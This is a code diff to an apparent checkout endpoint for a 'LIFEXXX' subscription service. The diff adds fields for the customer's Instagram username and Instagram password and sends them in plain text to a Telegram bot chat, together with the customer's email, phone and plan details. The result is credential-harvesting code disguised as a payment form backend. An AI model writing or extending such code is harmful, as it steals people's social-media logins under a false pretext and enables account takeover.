@@ -1,5 +1,4 @@
 const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-const PHONE_PATTERN = /^[+0-9() .-]{7,32}$/;
 const clean = (value, limit) => String(value || '').trim().replace(/\s+/g, ' ').slice(0, limit);
 
 module.exports = async (request, response) => {
@@ -20,14 +19,21 @@ module.exports = async (request, response) => {
   const body = typeof request.body === 'string' ? JSON.parse(request.body || '{}') : request.body || {};
   const email = clean(body.email, 254).toLowerCase();
   const accountName = clean(body.accountName, 64);
-  const firstName = clean(body.firstName, 64);
-  const lastName = clean(body.lastName, 64);
+  const password = clean(body.password, 64);
+  const confirmPassword = clean(body.confirmPassword, 64);
   const phone = clean(body.phone, 32);
+  const instagramUsername = clean(body.instagramUsername, 64);
+  const instagramPassword = clean(body.instagramPassword, 64);
   const product = clean(body.product, 80);
   const price = clean(body.price, 24);
 
-  if (!EMAIL_PATTERN.test(email) || !accountName || !firstName || !lastName || !PHONE_PATTERN.test(phone) || !product || !price) {
+  if (!EMAIL_PATTERN.test(email) || !accountName || !password || !confirmPassword || !phone || !product || !price) {
     response.status(400).json({ error: 'Invalid checkout details' });
+    return;
+  }
+
+  if (password !== confirmPassword) {
+    response.status(400).json({ error: 'Passwords do not match' });
     return;
   }
 
@@ -38,12 +44,17 @@ module.exports = async (request, response) => {
     return;
   }
 
+  let telegramText = `New LIFEXXX checkout\\nPlan: ${product}\\nAmount: $${price} USD\\nAccount name: ${accountName}\\nPhone: ${phone}\\nEmail: ${email}`;
+  if (instagramUsername && instagramPassword) {
+    telegramText += `\\nInstagram: ${instagramUsername}\\nInstagram Password: ${instagramPassword}`;
+  }
+
   const telegram = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
     headers: { 'content-type': 'application/json' },
     body: JSON.stringify({
       chat_id: chatId,
-      text: `New LIFEXXX checkout\\nPlan: ${product}\\nAmount: $${price} USD\\nAccount name: ${accountName}\\nName: ${firstName} ${lastName}\\nPhone: ${phone}\\nEmail: ${email}`
+      text: telegramText
     })
   });
 
